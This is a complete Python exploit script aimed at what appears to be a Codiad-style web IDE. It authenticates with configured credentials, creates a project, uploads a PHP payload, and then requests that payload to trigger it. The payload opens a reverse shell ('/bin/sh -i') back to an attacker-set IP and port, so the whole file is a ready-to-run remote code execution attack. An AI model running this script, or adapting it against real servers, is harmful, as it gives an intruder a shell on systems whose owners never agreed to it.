
#!/usr/bin/env python3

import requests
import sys
from typing import Dict, Tuple

# Configure
IP = '10.4.50.128'
PORT = 1234  # int
USER = 'john'
PASS = 'password'
HOST = 'http://10.10.33.250:62337'  # requires http:// schema

# Don't touch for basic use
AUTH_ENDPOINT = 'components/user/controller.php?action=authenticate'
PROJ_ENDPOINT = 'components/project/controller.php?action=create&project_name={}&project_path={}'
FILE_ENDPOINT = 'components/filemanager/controller.php?action=upload&path={}'
VULN_ENDPOINT = 'workspace/{}/{}'
PAYLOAD = '''<?php
    $sock=fsockopen("{}",{});
    $proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>'''
PROJECT_NAME = 'exploit'
PAYLOAD_NAME = 'exploit.php'


def build_payload(ip: str, port: int) -> str:
    return PAYLOAD.format(ip, port)


def build_endpoint(endpoint: str) -> str:
    return f'{HOST}/{endpoint}'


def build_authentication_form(username: str, password: str) -> Dict[str, str]:
    return {
        "username": username,
        "password": password,
        "theme": "default",
        "language": "en",
    }


def populate_vuln_endpoint(project: str, file: str) -> str:
    return VULN_ENDPOINT.format(project, file)


def populate_project_creation_params(name: str) -> str:
    return PROJ_ENDPOINT.format(name, name)


def populate_file_upload_params(name: str) -> str:
    return FILE_ENDPOINT.format(name)


def populate_file_upload_form(payload: str) -> Dict[str, Tuple[str, bytes, str]]:
    return {
        'upload[]': (PAYLOAD_NAME, payload.encode(), 'text/php')
    }


def main():

    if not (IP and PORT and USER and PASS and HOST):
        sys.exit("[!] Configure IP, PORT, USER, PASS, HOST variables !")

    # Init session
    s = requests.session()

    # Authenticate
    s.post(build_endpoint(AUTH_ENDPOINT),
           data=build_authentication_form(USER, PASS))

    # Create new project
    project_url = populate_project_creation_params(PROJECT_NAME)
    s.get(build_endpoint(project_url))

    # Upload payload to created project
    file_url = populate_file_upload_params(PROJECT_NAME)
    s.post(build_endpoint(file_url),
           files=populate_file_upload_form(build_payload(IP, PORT)))

    # Navigate to payload
    vuln = populate_vuln_endpoint(PROJECT_NAME, PAYLOAD_NAME)
    s.get(build_endpoint(vuln))


if __name__ == '__main__':
    main()
